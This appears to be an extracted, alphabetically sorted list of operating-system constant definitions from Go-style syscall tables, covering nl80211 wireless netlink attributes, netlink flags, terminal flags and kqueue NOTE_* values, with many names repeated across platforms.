NL80211_PMSR_FTM_RESP_ATTR_BUSY_RETRY_TIME              = 0x5
NL80211_PMSR_FTM_RESP_ATTR_CIVICLOC                     = 0x14
NL80211_PMSR_FTM_RESP_ATTR_DIST_AVG                     = 0x10
NL80211_PMSR_FTM_RESP_ATTR_DIST_SPREAD                  = 0x12
NL80211_PMSR_FTM_RESP_ATTR_DIST_VARIANCE                = 0x11
NL80211_PMSR_FTM_RESP_ATTR_FAIL_REASON                  = 0x1
NL80211_PMSR_FTM_RESP_ATTR_FTMS_PER_BURST               = 0x8
NL80211_PMSR_FTM_RESP_ATTR_LCI                          = 0x13
NL80211_PMSR_FTM_RESP_ATTR_MAX                          = 0x15
NL80211_PMSR_FTM_RESP_ATTR_NUM_BURSTS_EXP               = 0x6
NL80211_PMSR_FTM_RESP_ATTR_NUM_FTMR_ATTEMPTS            = 0x3
NL80211_PMSR_FTM_RESP_ATTR_NUM_FTMR_SUCCESSES           = 0x4
NL80211_PMSR_FTM_RESP_ATTR_PAD                          = 0x15
NL80211_PMSR_FTM_RESP_ATTR_RSSI_AVG                     = 0x9
NL80211_PMSR_FTM_RESP_ATTR_RSSI_SPREAD                  = 0xa
NL80211_PMSR_FTM_RESP_ATTR_RTT_AVG                      = 0xd
NL80211_PMSR_FTM_RESP_ATTR_RTT_SPREAD                   = 0xf
NL80211_PMSR_FTM_RESP_ATTR_RTT_VARIANCE                 = 0xe
NL80211_PMSR_FTM_RESP_ATTR_RX_RATE                      = 0xc
NL80211_PMSR_FTM_RESP_ATTR_TX_RATE                      = 0xb
NL80211_PMSR_PEER_ATTR_ADDR                             = 0x1
NL80211_PMSR_PEER_ATTR_CHAN                             = 0x2
NL80211_PMSR_PEER_ATTR_MAX                              = 0x4
NL80211_PMSR_PEER_ATTR_REQ                              = 0x3
NL80211_PMSR_PEER_ATTR_RESP                             = 0x4
NL80211_PMSR_REQ_ATTR_DATA                              = 0x1
NL80211_PMSR_REQ_ATTR_GET_AP_TSF                        = 0x2
NL80211_PMSR_REQ_ATTR_MAX                               = 0x2
NL80211_PMSR_RESP_ATTR_AP_TSF                           = 0x4
NL80211_PMSR_RESP_ATTR_DATA                             = 0x1
NL80211_PMSR_RESP_ATTR_FINAL                            = 0x5
NL80211_PMSR_RESP_ATTR_HOST_TIME                        = 0x3
NL80211_PMSR_RESP_ATTR_MAX                              = 0x6
NL80211_PMSR_RESP_ATTR_PAD                              = 0x6
NL80211_PMSR_RESP_ATTR_STATUS                           = 0x2
NL80211_PMSR_STATUS_FAILURE                             = 0x3
NL80211_PMSR_STATUS_REFUSED                             = 0x1
NL80211_PMSR_STATUS_SUCCESS                             = 0x0
NL80211_PMSR_STATUS_TIMEOUT                             = 0x2
NL80211_PMSR_TYPE_FTM                                   = 0x1
NL80211_PMSR_TYPE_INVALID                               = 0x0
NL80211_PMSR_TYPE_MAX                                   = 0x1
NL80211_PREAMBLE_DMG                                    = 0x3
NL80211_PREAMBLE_HE                                     = 0x4
NL80211_PREAMBLE_HT                                     = 0x1
NL80211_PREAMBLE_LEGACY                                 = 0x0
NL80211_PREAMBLE_VHT                                    = 0x2
NL80211_PROBE_RESP_OFFLOAD_SUPPORT_80211U               = 0x8
NL80211_PROBE_RESP_OFFLOAD_SUPPORT_P2P                  = 0x4
NL80211_PROBE_RESP_OFFLOAD_SUPPORT_WPS                  = 0x1
NL80211_PROBE_RESP_OFFLOAD_SUPPORT_WPS2                 = 0x2
NL80211_PROTOCOL_FEATURE_SPLIT_WIPHY_DUMP               = 0x1
NL80211_PS_DISABLED                                     = 0x0
NL80211_PS_ENABLED                                      = 0x1
NL80211_RADAR_CAC_ABORTED                               = 0x2
NL80211_RADAR_CAC_FINISHED                              = 0x1
NL80211_RADAR_CAC_STARTED                               = 0x5
NL80211_RADAR_DETECTED                                  = 0x0
NL80211_RADAR_NOP_FINISHED                              = 0x3
NL80211_RADAR_PRE_CAC_EXPIRED                           = 0x4
NL80211_RATE_INFO_10_MHZ_WIDTH                          = 0xb
NL80211_RATE_INFO_160_MHZ_WIDTH                         = 0xa
NL80211_RATE_INFO_40_MHZ_WIDTH                          = 0x3
NL80211_RATE_INFO_5_MHZ_WIDTH                           = 0xc
NL80211_RATE_INFO_80P80_MHZ_WIDTH                       = 0x9
NL80211_RATE_INFO_80_MHZ_WIDTH                          = 0x8
NL80211_RATE_INFO_BITRATE                               = 0x1
NL80211_RATE_INFO_BITRATE32                             = 0x5
NL80211_RATE_INFO_HE_1XLTF                              = 0x0
NL80211_RATE_INFO_HE_2XLTF                              = 0x1
NL80211_RATE_INFO_HE_4XLTF                              = 0x2
NL80211_RATE_INFO_HE_DCM                                = 0x10
NL80211_RATE_INFO_HE_GI                                 = 0xf
NL80211_RATE_INFO_HE_GI_0_8                             = 0x0
NL80211_RATE_INFO_HE_GI_1_6                             = 0x1
NL80211_RATE_INFO_HE_GI_3_2                             = 0x2
NL80211_RATE_INFO_HE_MCS                                = 0xd
NL80211_RATE_INFO_HE_NSS                                = 0xe
NL80211_RATE_INFO_HE_RU_ALLOC                           = 0x11
NL80211_RATE_INFO_HE_RU_ALLOC_106                       = 0x2
NL80211_RATE_INFO_HE_RU_ALLOC_242                       = 0x3
NL80211_RATE_INFO_HE_RU_ALLOC_26                        = 0x0
NL80211_RATE_INFO_HE_RU_ALLOC_2x996                     = 0x6
NL80211_RATE_INFO_HE_RU_ALLOC_484                       = 0x4
NL80211_RATE_INFO_HE_RU_ALLOC_52                        = 0x1
NL80211_RATE_INFO_HE_RU_ALLOC_996                       = 0x5
NL80211_RATE_INFO_MAX                                   = 0x16
NL80211_RATE_INFO_MCS                                   = 0x2
NL80211_RATE_INFO_SHORT_GI                              = 0x4
NL80211_RATE_INFO_VHT_MCS                               = 0x6
NL80211_RATE_INFO_VHT_NSS                               = 0x7
NL80211_REGDOM_SET_BY_CORE                              = 0x0
NL80211_REGDOM_SET_BY_COUNTRY_IE                        = 0x3
NL80211_REGDOM_SET_BY_DRIVER                            = 0x2
NL80211_REGDOM_SET_BY_USER                              = 0x1
NL80211_REGDOM_TYPE_COUNTRY                             = 0x0
NL80211_REGDOM_TYPE_CUSTOM_WORLD                        = 0x2
NL80211_REGDOM_TYPE_INTERSECTION                        = 0x3
NL80211_REGDOM_TYPE_WORLD                               = 0x1
NL80211_REG_RULE_ATTR_MAX                               = 0x7
NL80211_REKEY_DATA_AKM                                  = 0x4
NL80211_REKEY_DATA_KCK                                  = 0x2
NL80211_REKEY_DATA_KEK                                  = 0x1
NL80211_REKEY_DATA_REPLAY_CTR                           = 0x3
NL80211_REPLAY_CTR_LEN                                  = 0x8
NL80211_RRF_AUTO_BW                                     = 0x800
NL80211_RRF_DFS                                         = 0x10
NL80211_RRF_GO_CONCURRENT                               = 0x1000
NL80211_RRF_IR_CONCURRENT                               = 0x1000
NL80211_RRF_NO_160MHZ                                   = 0x10000
NL80211_RRF_NO_80MHZ                                    = 0x8000
NL80211_RRF_NO_CCK                                      = 0x2
NL80211_RRF_NO_HE                                       = 0x20000
NL80211_RRF_NO_HT40                                     = 0x6000
NL80211_RRF_NO_HT40MINUS                                = 0x2000
NL80211_RRF_NO_HT40PLUS                                 = 0x4000
NL80211_RRF_NO_IBSS                                     = 0x80
NL80211_RRF_NO_INDOOR                                   = 0x4
NL80211_RRF_NO_IR                                       = 0x80
NL80211_RRF_NO_IR_ALL                                   = 0x180
NL80211_RRF_NO_OFDM                                     = 0x1
NL80211_RRF_NO_OUTDOOR                                  = 0x8
NL80211_RRF_PASSIVE_SCAN                                = 0x80
NL80211_RRF_PTMP_ONLY                                   = 0x40
NL80211_RRF_PTP_ONLY                                    = 0x20
NL80211_RXMGMT_FLAG_ANSWERED                            = 0x1
NL80211_RXMGMT_FLAG_EXTERNAL_AUTH                       = 0x2
NL80211_SAE_PWE_BOTH                                    = 0x3
NL80211_SAE_PWE_HASH_TO_ELEMENT                         = 0x2
NL80211_SAE_PWE_HUNT_AND_PECK                           = 0x1
NL80211_SAE_PWE_UNSPECIFIED                             = 0x0
NL80211_SAR_ATTR_MAX                                    = 0x2
NL80211_SAR_ATTR_SPECS                                  = 0x2
NL80211_SAR_ATTR_SPECS_END_FREQ                         = 0x4
NL80211_SAR_ATTR_SPECS_MAX                              = 0x4
NL80211_SAR_ATTR_SPECS_POWER                            = 0x1
NL80211_SAR_ATTR_SPECS_RANGE_INDEX                      = 0x2
NL80211_SAR_ATTR_SPECS_START_FREQ                       = 0x3
NL80211_SAR_ATTR_TYPE                                   = 0x1
NL80211_SAR_TYPE_POWER                                  = 0x0
NL80211_SCAN_FLAG_ACCEPT_BCAST_PROBE_RESP               = 0x20
NL80211_SCAN_FLAG_AP                                    = 0x4
NL80211_SCAN_FLAG_COLOCATED_6GHZ                        = 0x4000
NL80211_SCAN_FLAG_FILS_MAX_CHANNEL_TIME                 = 0x10
NL80211_SCAN_FLAG_FLUSH                                 = 0x2
NL80211_SCAN_FLAG_FREQ_KHZ                              = 0x2000
NL80211_SCAN_FLAG_HIGH_ACCURACY                         = 0x400
NL80211_SCAN_FLAG_LOW_POWER                             = 0x200
NL80211_SCAN_FLAG_LOW_PRIORITY                          = 0x1
NL80211_SCAN_FLAG_LOW_SPAN                              = 0x100
NL80211_SCAN_FLAG_MIN_PREQ_CONTENT                      = 0x1000
NL80211_SCAN_FLAG_OCE_PROBE_REQ_DEFERRAL_SUPPRESSION    = 0x80
NL80211_SCAN_FLAG_OCE_PROBE_REQ_HIGH_TX_RATE            = 0x40
NL80211_SCAN_FLAG_RANDOM_ADDR                           = 0x8
NL80211_SCAN_FLAG_RANDOM_SN                             = 0x800
NL80211_SCAN_RSSI_THOLD_OFF                             = -0x12c
NL80211_SCHED_SCAN_MATCH_ATTR_BSSID                     = 0x5
NL80211_SCHED_SCAN_MATCH_ATTR_MAX                       = 0x6
NL80211_SCHED_SCAN_MATCH_ATTR_RELATIVE_RSSI             = 0x3
NL80211_SCHED_SCAN_MATCH_ATTR_RSSI                      = 0x2
NL80211_SCHED_SCAN_MATCH_ATTR_RSSI_ADJUST               = 0x4
NL80211_SCHED_SCAN_MATCH_ATTR_SSID                      = 0x1
NL80211_SCHED_SCAN_MATCH_PER_BAND_RSSI                  = 0x6
NL80211_SCHED_SCAN_PLAN_INTERVAL                        = 0x1
NL80211_SCHED_SCAN_PLAN_ITERATIONS                      = 0x2
NL80211_SCHED_SCAN_PLAN_MAX                             = 0x2
NL80211_SMPS_DYNAMIC                                    = 0x2
NL80211_SMPS_MAX                                        = 0x2
NL80211_SMPS_OFF                                        = 0x0
NL80211_SMPS_STATIC                                     = 0x1
NL80211_STA_BSS_PARAM_BEACON_INTERVAL                   = 0x5
NL80211_STA_BSS_PARAM_CTS_PROT                          = 0x1
NL80211_STA_BSS_PARAM_DTIM_PERIOD                       = 0x4
NL80211_STA_BSS_PARAM_MAX                               = 0x5
NL80211_STA_BSS_PARAM_SHORT_PREAMBLE                    = 0x2
NL80211_STA_BSS_PARAM_SHORT_SLOT_TIME                   = 0x3
NL80211_STA_FLAG_ASSOCIATED                             = 0x7
NL80211_STA_FLAG_AUTHENTICATED                          = 0x5
NL80211_STA_FLAG_AUTHORIZED                             = 0x1
NL80211_STA_FLAG_MAX                                    = 0x7
NL80211_STA_FLAG_MAX_OLD_API                            = 0x6
NL80211_STA_FLAG_MFP                                    = 0x4
NL80211_STA_FLAG_SHORT_PREAMBLE                         = 0x2
NL80211_STA_FLAG_TDLS_PEER                              = 0x6
NL80211_STA_FLAG_WME                                    = 0x3
NL80211_STA_INFO_ACK_SIGNAL                             = 0x22
NL80211_STA_INFO_ACK_SIGNAL_AVG                         = 0x23
NL80211_STA_INFO_AIRTIME_LINK_METRIC                    = 0x29
NL80211_STA_INFO_AIRTIME_WEIGHT                         = 0x28
NL80211_STA_INFO_ASSOC_AT_BOOTTIME                      = 0x2a
NL80211_STA_INFO_BEACON_LOSS                            = 0x12
NL80211_STA_INFO_BEACON_RX                              = 0x1d
NL80211_STA_INFO_BEACON_SIGNAL_AVG                      = 0x1e
NL80211_STA_INFO_BSS_PARAM                              = 0xf
NL80211_STA_INFO_CHAIN_SIGNAL                           = 0x19
NL80211_STA_INFO_CHAIN_SIGNAL_AVG                       = 0x1a
NL80211_STA_INFO_CONNECTED_TIME                         = 0x10
NL80211_STA_INFO_CONNECTED_TO_AS                        = 0x2b
NL80211_STA_INFO_CONNECTED_TO_GATE                      = 0x26
NL80211_STA_INFO_DATA_ACK_SIGNAL_AVG                    = 0x23
NL80211_STA_INFO_EXPECTED_THROUGHPUT                    = 0x1b
NL80211_STA_INFO_FCS_ERROR_COUNT                        = 0x25
NL80211_STA_INFO_INACTIVE_TIME                          = 0x1
NL80211_STA_INFO_LLID                                   = 0x4
NL80211_STA_INFO_LOCAL_PM                               = 0x14
NL80211_STA_INFO_MAX                                    = 0x2b
NL80211_STA_INFO_NONPEER_PM                             = 0x16
NL80211_STA_INFO_PAD                                    = 0x21
NL80211_STA_INFO_PEER_PM                                = 0x15
NL80211_STA_INFO_PLID                                   = 0x5
NL80211_STA_INFO_PLINK_STATE                            = 0x6
NL80211_STA_INFO_RX_BITRATE                             = 0xe
NL80211_STA_INFO_RX_BYTES                               = 0x2
NL80211_STA_INFO_RX_BYTES64                             = 0x17
NL80211_STA_INFO_RX_DROP_MISC                           = 0x1c
NL80211_STA_INFO_RX_DURATION                            = 0x20
NL80211_STA_INFO_RX_MPDUS                               = 0x24
NL80211_STA_INFO_RX_PACKETS                             = 0x9
NL80211_STA_INFO_SIGNAL                                 = 0x7
NL80211_STA_INFO_SIGNAL_AVG                             = 0xd
NL80211_STA_INFO_STA_FLAGS                              = 0x11
NL80211_STA_INFO_TID_STATS                              = 0x1f
NL80211_STA_INFO_TX_BITRATE                             = 0x8
NL80211_STA_INFO_TX_BYTES                               = 0x3
NL80211_STA_INFO_TX_BYTES64                             = 0x18
NL80211_STA_INFO_TX_DURATION                            = 0x27
NL80211_STA_INFO_TX_FAILED                              = 0xc
NL80211_STA_INFO_TX_PACKETS                             = 0xa
NL80211_STA_INFO_TX_RETRIES                             = 0xb
NL80211_STA_INFO_T_OFFSET                               = 0x13
NL80211_STA_WME_MAX                                     = 0x2
NL80211_STA_WME_MAX_SP                                  = 0x2
NL80211_STA_WME_UAPSD_QUEUES                            = 0x1
NL80211_SURVEY_INFO_CHANNEL_TIME                        = 0x4
NL80211_SURVEY_INFO_CHANNEL_TIME_BUSY                   = 0x5
NL80211_SURVEY_INFO_CHANNEL_TIME_EXT_BUSY               = 0x6
NL80211_SURVEY_INFO_CHANNEL_TIME_RX                     = 0x7
NL80211_SURVEY_INFO_CHANNEL_TIME_TX                     = 0x8
NL80211_SURVEY_INFO_FREQUENCY                           = 0x1
NL80211_SURVEY_INFO_FREQUENCY_OFFSET                    = 0xc
NL80211_SURVEY_INFO_IN_USE                              = 0x3
NL80211_SURVEY_INFO_MAX                                 = 0xc
NL80211_SURVEY_INFO_NOISE                               = 0x2
NL80211_SURVEY_INFO_PAD                                 = 0xa
NL80211_SURVEY_INFO_TIME                                = 0x4
NL80211_SURVEY_INFO_TIME_BSS_RX                         = 0xb
NL80211_SURVEY_INFO_TIME_BUSY                           = 0x5
NL80211_SURVEY_INFO_TIME_EXT_BUSY                       = 0x6
NL80211_SURVEY_INFO_TIME_RX                             = 0x7
NL80211_SURVEY_INFO_TIME_SCAN                           = 0x9
NL80211_SURVEY_INFO_TIME_TX                             = 0x8
NL80211_TDLS_DISABLE_LINK                               = 0x4
NL80211_TDLS_DISCOVERY_REQ                              = 0x0
NL80211_TDLS_ENABLE_LINK                                = 0x3
NL80211_TDLS_PEER_HE                                    = 0x8
NL80211_TDLS_PEER_HT                                    = 0x1
NL80211_TDLS_PEER_VHT                                   = 0x2
NL80211_TDLS_PEER_WMM                                   = 0x4
NL80211_TDLS_SETUP                                      = 0x1
NL80211_TDLS_TEARDOWN                                   = 0x2
NL80211_TID_CONFIG_ATTR_AMPDU_CTRL                      = 0x9
NL80211_TID_CONFIG_ATTR_AMSDU_CTRL                      = 0xb
NL80211_TID_CONFIG_ATTR_MAX                             = 0xd
NL80211_TID_CONFIG_ATTR_NOACK                           = 0x6
NL80211_TID_CONFIG_ATTR_OVERRIDE                        = 0x4
NL80211_TID_CONFIG_ATTR_PAD                             = 0x1
NL80211_TID_CONFIG_ATTR_PEER_SUPP                       = 0x3
NL80211_TID_CONFIG_ATTR_RETRY_LONG                      = 0x8
NL80211_TID_CONFIG_ATTR_RETRY_SHORT                     = 0x7
NL80211_TID_CONFIG_ATTR_RTSCTS_CTRL                     = 0xa
NL80211_TID_CONFIG_ATTR_TIDS                            = 0x5
NL80211_TID_CONFIG_ATTR_TX_RATE                         = 0xd
NL80211_TID_CONFIG_ATTR_TX_RATE_TYPE                    = 0xc
NL80211_TID_CONFIG_ATTR_VIF_SUPP                        = 0x2
NL80211_TID_CONFIG_DISABLE                              = 0x1
NL80211_TID_CONFIG_ENABLE                               = 0x0
NL80211_TID_STATS_MAX                                   = 0x6
NL80211_TID_STATS_PAD                                   = 0x5
NL80211_TID_STATS_RX_MSDU                               = 0x1
NL80211_TID_STATS_TXQ_STATS                             = 0x6
NL80211_TID_STATS_TX_MSDU                               = 0x2
NL80211_TID_STATS_TX_MSDU_FAILED                        = 0x4
NL80211_TID_STATS_TX_MSDU_RETRIES                       = 0x3
NL80211_TIMEOUT_ASSOC                                   = 0x3
NL80211_TIMEOUT_AUTH                                    = 0x2
NL80211_TIMEOUT_SCAN                                    = 0x1
NL80211_TIMEOUT_UNSPECIFIED                             = 0x0
NL80211_TKIP_DATA_OFFSET_ENCR_KEY                       = 0x0
NL80211_TKIP_DATA_OFFSET_RX_MIC_KEY                     = 0x18
NL80211_TKIP_DATA_OFFSET_TX_MIC_KEY                     = 0x10
NL80211_TXQ_ATTR_AC                                     = 0x1
NL80211_TXQ_ATTR_AIFS                                   = 0x5
NL80211_TXQ_ATTR_CWMAX                                  = 0x4
NL80211_TXQ_ATTR_CWMIN                                  = 0x3
NL80211_TXQ_ATTR_MAX                                    = 0x5
NL80211_TXQ_ATTR_QUEUE                                  = 0x1
NL80211_TXQ_ATTR_TXOP                                   = 0x2
NL80211_TXQ_Q_BE                                        = 0x2
NL80211_TXQ_Q_BK                                        = 0x3
NL80211_TXQ_Q_VI                                        = 0x1
NL80211_TXQ_Q_VO                                        = 0x0
NL80211_TXQ_STATS_BACKLOG_BYTES                         = 0x1
NL80211_TXQ_STATS_BACKLOG_PACKETS                       = 0x2
NL80211_TXQ_STATS_COLLISIONS                            = 0x8
NL80211_TXQ_STATS_DROPS                                 = 0x4
NL80211_TXQ_STATS_ECN_MARKS                             = 0x5
NL80211_TXQ_STATS_FLOWS                                 = 0x3
NL80211_TXQ_STATS_MAX                                   = 0xb
NL80211_TXQ_STATS_MAX_FLOWS                             = 0xb
NL80211_TXQ_STATS_OVERLIMIT                             = 0x6
NL80211_TXQ_STATS_OVERMEMORY                            = 0x7
NL80211_TXQ_STATS_TX_BYTES                              = 0x9
NL80211_TXQ_STATS_TX_PACKETS                            = 0xa
NL80211_TXRATE_DEFAULT_GI                               = 0x0
NL80211_TXRATE_FORCE_LGI                                = 0x2
NL80211_TXRATE_FORCE_SGI                                = 0x1
NL80211_TXRATE_GI                                       = 0x4
NL80211_TXRATE_HE                                       = 0x5
NL80211_TXRATE_HE_GI                                    = 0x6
NL80211_TXRATE_HE_LTF                                   = 0x7
NL80211_TXRATE_HT                                       = 0x2
NL80211_TXRATE_LEGACY                                   = 0x1
NL80211_TXRATE_MAX                                      = 0x7
NL80211_TXRATE_MCS                                      = 0x2
NL80211_TXRATE_VHT                                      = 0x3
NL80211_TX_POWER_AUTOMATIC                              = 0x0
NL80211_TX_POWER_FIXED                                  = 0x2
NL80211_TX_POWER_LIMITED                                = 0x1
NL80211_TX_RATE_AUTOMATIC                               = 0x0
NL80211_TX_RATE_FIXED                                   = 0x2
NL80211_TX_RATE_LIMITED                                 = 0x1
NL80211_UNSOL_BCAST_PROBE_RESP_ATTR_INT                 = 0x1
NL80211_UNSOL_BCAST_PROBE_RESP_ATTR_MAX                 = 0x2
NL80211_UNSOL_BCAST_PROBE_RESP_ATTR_TMPL                = 0x2
NL80211_USER_REG_HINT_CELL_BASE                         = 0x1
NL80211_USER_REG_HINT_INDOOR                            = 0x2
NL80211_USER_REG_HINT_USER                              = 0x0
NL80211_VENDOR_ID_IS_LINUX                              = 0x80000000
NL80211_VHT_CAPABILITY_LEN                              = 0xc
NL80211_VHT_NSS_MAX                                     = 0x8
NL80211_WIPHY_NAME_MAXLEN                               = 0x40
NL80211_WMMR_AIFSN                                      = 0x3
NL80211_WMMR_CW_MAX                                     = 0x2
NL80211_WMMR_CW_MIN                                     = 0x1
NL80211_WMMR_MAX                                        = 0x4
NL80211_WMMR_TXOP                                       = 0x4
NL80211_WOWLAN_PKTPAT_MASK                              = 0x1
NL80211_WOWLAN_PKTPAT_OFFSET                            = 0x3
NL80211_WOWLAN_PKTPAT_PATTERN                           = 0x2
NL80211_WOWLAN_TCP_DATA_INTERVAL                        = 0x9
NL80211_WOWLAN_TCP_DATA_PAYLOAD                         = 0x6
NL80211_WOWLAN_TCP_DATA_PAYLOAD_SEQ                     = 0x7
NL80211_WOWLAN_TCP_DATA_PAYLOAD_TOKEN                   = 0x8
NL80211_WOWLAN_TCP_DST_IPV4                             = 0x2
NL80211_WOWLAN_TCP_DST_MAC                              = 0x3
NL80211_WOWLAN_TCP_DST_PORT                             = 0x5
NL80211_WOWLAN_TCP_SRC_IPV4                             = 0x1
NL80211_WOWLAN_TCP_SRC_PORT                             = 0x4
NL80211_WOWLAN_TCP_WAKE_MASK                            = 0xb
NL80211_WOWLAN_TCP_WAKE_PAYLOAD                         = 0xa
NL80211_WOWLAN_TRIG_4WAY_HANDSHAKE                      = 0x8
NL80211_WOWLAN_TRIG_ANY                                 = 0x1
NL80211_WOWLAN_TRIG_DISCONNECT                          = 0x2
NL80211_WOWLAN_TRIG_EAP_IDENT_REQUEST                   = 0x7
NL80211_WOWLAN_TRIG_GTK_REKEY_FAILURE                   = 0x6
NL80211_WOWLAN_TRIG_GTK_REKEY_SUPPORTED                 = 0x5
NL80211_WOWLAN_TRIG_MAGIC_PKT                           = 0x3
NL80211_WOWLAN_TRIG_NET_DETECT                          = 0x12
NL80211_WOWLAN_TRIG_NET_DETECT_RESULTS                  = 0x13
NL80211_WOWLAN_TRIG_PKT_PATTERN                         = 0x4
NL80211_WOWLAN_TRIG_RFKILL_RELEASE                      = 0x9
NL80211_WOWLAN_TRIG_TCP_CONNECTION                      = 0xe
NL80211_WOWLAN_TRIG_WAKEUP_PKT_80211                    = 0xa
NL80211_WOWLAN_TRIG_WAKEUP_PKT_80211_LEN                = 0xb
NL80211_WOWLAN_TRIG_WAKEUP_PKT_8023                     = 0xc
NL80211_WOWLAN_TRIG_WAKEUP_PKT_8023_LEN                 = 0xd
NL80211_WOWLAN_TRIG_WAKEUP_TCP_CONNLOST                 = 0x10
NL80211_WOWLAN_TRIG_WAKEUP_TCP_MATCH                    = 0xf
NL80211_WOWLAN_TRIG_WAKEUP_TCP_NOMORETOKENS             = 0x11
NL80211_WPA_VERSION_1                                   = 0x1
NL80211_WPA_VERSION_2                                   = 0x2
NL80211_WPA_VERSION_3                                   = 0x4
NLA_ALIGNTO                                 = 0x4
NLA_F_NESTED                                = 0x8000
NLA_F_NET_BYTEORDER                         = 0x4000
NLA_HDRLEN                                  = 0x4
NLDLY                                   = 0x300
NLDLY                            = 0x100
NLDLY                            = 0x300
NLDLY                         = 0x100
NLDLY                         = 0x4000
NLMSG
NLMSGERR_ATTR_COOKIE = 0x3
NLMSGERR_ATTR_MSG    = 0x1
NLMSGERR_ATTR_OFFS   = 0x2
NLMSG_ALIGNTO                               = 0x4
NLMSG_DONE                                  = 0x3
NLMSG_ERROR                                 = 0x2
NLMSG_HDRLEN                                = 0x10
NLMSG_MIN_TYPE                              = 0x10
NLMSG_NOOP                                  = 0x1
NLMSG_OVERRUN                               = 0x4
NLM_F_ACK                                   = 0x4
NLM_F_ACK_TLVS                              = 0x200
NLM_F_APPEND                                = 0x800
NLM_F_ATOMIC                                = 0x400
NLM_F_BULK                                  = 0x200
NLM_F_CAPPED                                = 0x100
NLM_F_CREATE                                = 0x400
NLM_F_DUMP                                  = 0x300
NLM_F_DUMP_FILTERED                         = 0x20
NLM_F_DUMP_INTR                             = 0x10
NLM_F_ECHO                                  = 0x8
NLM_F_EXCL                                  = 0x200
NLM_F_MATCH                                 = 0x200
NLM_F_MULTI                                 = 0x2
NLM_F_NONREC                                = 0x100
NLM_F_REPLACE                               = 0x100
NLM_F_REQUEST                               = 0x1
NLM_F_ROOT                                  = 0x100
NL_ATTR_TYPE_BINARY       = 0xa
NL_ATTR_TYPE_BITFIELD32   = 0xf
NL_ATTR_TYPE_FLAG         = 0x1
NL_ATTR_TYPE_INVALID      = 0x0
NL_ATTR_TYPE_NESTED       = 0xd
NL_ATTR_TYPE_NESTED_ARRAY = 0xe
NL_ATTR_TYPE_NUL_STRING   = 0xc
NL_ATTR_TYPE_S16          = 0x7
NL_ATTR_TYPE_S32          = 0x8
NL_ATTR_TYPE_S64          = 0x9
NL_ATTR_TYPE_S8           = 0x6
NL_ATTR_TYPE_STRING       = 0xb
NL_ATTR_TYPE_U16          = 0x3
NL_ATTR_TYPE_U32          = 0x4
NL_ATTR_TYPE_U64          = 0x5
NL_ATTR_TYPE_U8           = 0x2
NL_POLICY_TYPE_ATTR_BITFIELD32_MASK = 0xa
NL_POLICY_TYPE_ATTR_MASK            = 0xc
NL_POLICY_TYPE_ATTR_MAX             = 0xc
NL_POLICY_TYPE_ATTR_MAX_LENGTH      = 0x7
NL_POLICY_TYPE_ATTR_MAX_VALUE_S     = 0x3
NL_POLICY_TYPE_ATTR_MAX_VALUE_U     = 0x5
NL_POLICY_TYPE_ATTR_MIN_LENGTH      = 0x6
NL_POLICY_TYPE_ATTR_MIN_VALUE_S     = 0x2
NL_POLICY_TYPE_ATTR_MIN_VALUE_U     = 0x4
NL_POLICY_TYPE_ATTR_PAD             = 0xb
NL_POLICY_TYPE_ATTR_POLICY_IDX      = 0x8
NL_POLICY_TYPE_ATTR_POLICY_MAXTYPE  = 0x9
NL_POLICY_TYPE_ATTR_TYPE            = 0x1
NL_POLICY_TYPE_ATTR_UNSPEC          = 0x0
NO(DEFAULT
NOERROR                                                                   syscall.Errno = 0
NOFILE
NOFLSH                                  = 0x80000000
NOFLSH                            = 0x80000000
NOFLSH                           = 0x80
NOFLSH                           = 0x80000000
NOFLSH                         = 0x80000000
NOFLSH                        = 0x80
NOFLUSH                       = 0x80000000
NOKERNINFO                              = 0x2000000
NOKERNINFO                        = 0x2000000
NOKERNINFO                     = 0x2000000
NONZEROLHND         = LMEM_MOVEABLE
NONZEROLPTR         = LMEM_FIXED
NOPH
NORMAL_PRIORITY_CLASS         = 0x00000020
NOTE
NOTE:
NOTE_ABSOLUTE                           = 0x8
NOTE_ABSTIME                   = 0x10
NOTE_ATTRIB                             = 0x8
NOTE_ATTRIB                       = 0x8
NOTE_ATTRIB                    = 0x8
NOTE_BACKGROUND                         = 0x40
NOTE_CHANGE                       = 0x1
NOTE_CHILD                              = 0x4
NOTE_CHILD                        = 0x4
NOTE_CHILD                     = 0x4
NOTE_CLOSE                     = 0x100
NOTE_CLOSE_WRITE               = 0x200
NOTE_CRITICAL                           = 0x20
NOTE_DELETE                             = 0x1
NOTE_DELETE                       = 0x1
NOTE_DELETE                    = 0x1
NOTE_EOF                          = 0x2
NOTE_EXEC                               = 0x20000000
NOTE_EXEC                         = 0x20000000
NOTE_EXEC                      = 0x20000000
NOTE_EXIT                               = 0x80000000
NOTE_EXIT                         = 0x80000000
NOTE_EXIT                      = 0x80000000
NOTE_EXITSTATUS                         = 0x4000000
NOTE_EXIT_CSERROR                       = 0x40000
NOTE_EXIT_DECRYPTFAIL                   = 0x10000
NOTE_EXIT_DETAIL                        = 0x2000000
NOTE_EXIT_DETAIL_MASK                   = 0x70000
NOTE_EXIT_MEMORY                        = 0x20000
NOTE_EXIT_REPARENTED                    = 0x80000
NOTE_EXTEND                             = 0x4
NOTE_EXTEND                       = 0x4
NOTE_EXTEND                    = 0x4
NOTE_FFAND                              = 0x40000000
NOTE_FFAND                        = 0x40000000
NOTE_FFAND                     = 0x40000000
NOTE_FFCOPY                             = 0xc0000000
NOTE_FFCOPY                       = 0xc0000000
NOTE_FFCOPY                    = 0xc0000000
NOTE_FFCTRLMASK                         = 0xc0000000
NOTE_FFCTRLMASK                   = 0xc0000000
NOTE_FFCTRLMASK                = 0xc0000000
NOTE_FFLAGSMASK                         = 0xffffff
NOTE_FFLAGSMASK                   = 0xffffff
NOTE_FFLAGSMASK                = 0xffffff
NOTE_FFNOP                              = 0x0
NOTE_FFNOP                        = 0x0
NOTE_FFNOP                     = 0x0
NOTE_FFOR                               = 0x80000000
NOTE_FFOR                         = 0x80000000
NOTE_FFOR                      = 0x80000000
NOTE_FILE_POLL                 = 0x2
NOTE_FORK                               = 0x40000000
NOTE_FORK                         = 0x40000000
NOTE_FORK                      = 0x40000000
NOTE_FUNLOCK                            = 0x100
NOTE_LEEWAY                             = 0x10
NOTE_LINK                               = 0x10
NOTE_LINK                         = 0x10
NOTE_LINK                      = 0x10
NOTE_LOWAT                              = 0x1
NOTE_LOWAT                        = 0x1
NOTE_LOWAT                     = 0x1
NOTE_MACHTIME                           = 0x100
NOTE_MACH_CONTINUOUS_TIME               = 0x80
NOTE_MSECONDS                  = 0x2
NOTE_NONE                               = 0x80
NOTE_NSECONDS                           = 0x4
NOTE_NSECONDS                  = 0x8
NOTE_OOB                                = 0x2
NOTE_OOB                          = 0x2
